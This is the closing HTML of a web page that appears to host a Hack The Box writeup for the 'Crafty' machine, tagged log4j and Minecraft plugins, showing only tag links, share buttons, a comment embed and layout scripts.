    <a href="/search?q=log4j" class="tag" style="font-family: 'Cascadia Code';">log4j</a>
    
    <a href="/search?q=jdgui" class="tag" style="font-family: 'Cascadia Code';">jdgui</a>
    
    <a href="/search?q=analyzing-jar" class="tag" style="font-family: 'Cascadia Code';">analyzing-jar</a>
    
    <a href="/search?q=minecraft-plugins" class="tag" style="font-family: 'Cascadia Code';">minecraft-plugins</a>
    
    
</div>
  <br>
  Share this writeup:&nbsp;
  <a
    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Crafty.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
  <a
    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Crafty.html&text=Writeup+for+HTB Crafty writeup+from+HTB+held+on+11 June 2024&hashtags=ctf,writeup,Crafty,HTB,minecraft,log4j,jdgui,analyzing-jar,minecraft-plugins','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
  <a
    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Crafty.html&text=Writeup+for+HTB Crafty writeup+from+HTB+held+on+2024-06-11 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-linkedin" aria-hidden="true"></i></a>
</div>
    </section>
  </div>

  <div id="comments" class="container">
    <section id="disqus_container">
      
      <hr>
      <div id="disqus_thread"></div>
<script>
    function disqus_config() {
        this.callbacks.onReady.push(function() {
            setSizes();
        });
    }
    (function () {
        var d = document, s = d.createElement('script');
        s.src = 'https://captainirs-github-io.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by
        Disqus.</a></noscript>
      
    </section>
  </div>

  <footer>
    <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

  </footer>

  <script src="http://localhost:4000/assets/js/prism.js"></script>
  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
  <script>
    topScroll = document.getElementById("top");

    window.onscroll = function () { scrollFunction() };

    function scrollFunction() {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        topScroll.style.display = "block";
      } else {
        topScroll.style.display = "none";
      }
    }

    function topFunction() {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    }

    $(window).on('load', function () {

      $('a[download]').each((i, e) => {
        $(e).addClass('fa fa-download');
      });

      setSizes();
    });

    $(window).resize(setSizes);

    function setSizes() {
      if ($(window).width() < 960) {
        $('#bottom-bar').hide();
        $('footer').show();
        $('#navbarSupportedContent').css('max-height', 'unset');
        $('.navbar-collapse').collapse('hide');
        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
          $('footer').css("position", "unset");
        } else {
          $('footer').css("position", "fixed");
        }
      }
      else {
        $('#bottom-bar').show();
        $('footer').hide();
        $('.navbar-collapse').collapse('show');
        $('footer').css("position", "fixed");
        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
      }
    }
  </script>

</body>

</html>
